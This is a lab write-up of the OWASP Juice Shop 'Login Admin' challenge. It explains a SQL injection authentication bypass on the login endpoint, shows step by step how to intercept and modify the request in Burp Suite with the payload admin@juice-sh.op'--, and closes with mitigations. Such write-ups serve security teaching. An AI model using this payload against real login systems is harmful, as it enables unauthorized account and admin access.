# Login Admin Challenge

| Item | Detail |
|---|---|
| Category | Injection (SQL Injection) |
| Difficulty | Medium (2-Star) |
| Juice Shop Flag | `score-board#Login Admin` |
| Tools Used | Burp Suite (Proxy / Repeater) |
| Status | Solved |

---

## 1. Vulnerability Explanation

The login endpoint is vulnerable to **SQL Injection**.  
The application takes user input from the email field and directly concatenates it into a SQL query without proper sanitization.

By crafting a special payload, an attacker can bypass the password check and log in as any user — including the administrator.

This challenge is rated **2 stars** because it requires understanding SQL syntax such as comments and query termination.

---

## 2. Security Impact

- Complete bypass of authentication  
- Unauthorized access to admin functionality  
- Potential privilege escalation  
- Possible exposure of all user accounts  

---

## 3. Step-by-Step Exploitation

### Step 1: Find the admin email

Navigate to any product page and inspect the existing reviews.  
The administrator email is publicly visible:

```text
admin@juice-sh.op
```

### Step 2: Setup Burp Suite

- Configure browser to route traffic through Burp Suite (`127.0.0.1:8080`)  
- Navigate to the login page (`/#/login`)  

### Step 3: Intercept the login request

- Turn **Intercept ON** in Burp Proxy tab  
- Enter any email and password  

Example:

```text
test@test.com / 12345
```

- Click **Log In**  
- Burp captures the `POST /rest/user/login` request  

### Step 4: Modify the request in Repeater

Send the request to **Repeater** (`Ctrl + R`).

Original request:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"12345"}
```

Modified payload:

```json
{"email":"admin@juice-sh.op'--","password":"anything"}
```

### Step 5: Send the request

- Click **Send** in Repeater  

Successful response:

```json
{"authentication":{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...","bid":1,"umail":"admin@juice-sh.op"}}
```

### Step 6: Verify

- Check the **Score Board**  
- Challenge is marked as **Solved**

---

## 4. Why This Works

The vulnerable SQL query likely looks similar to:

```sql
SELECT * FROM Users WHERE email = '[user input]' AND password = '[hashed password]'
```

With the payload:

```text
admin@juice-sh.op'--
```

the query becomes:

```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'
```

The `--` comments out the password check, meaning only the email must match.

---

## 5. Mitigation

- Use parameterized queries / prepared statements  
- Never concatenate user input directly into SQL statements  
- Use an ORM that safely handles escaping  

---

## 6. Key Takeaways

- SQL Injection remains one of the most critical web vulnerabilities  
- `'--` is a classic authentication bypass payload  
- Burp Repeater is ideal for safely testing injection payloads  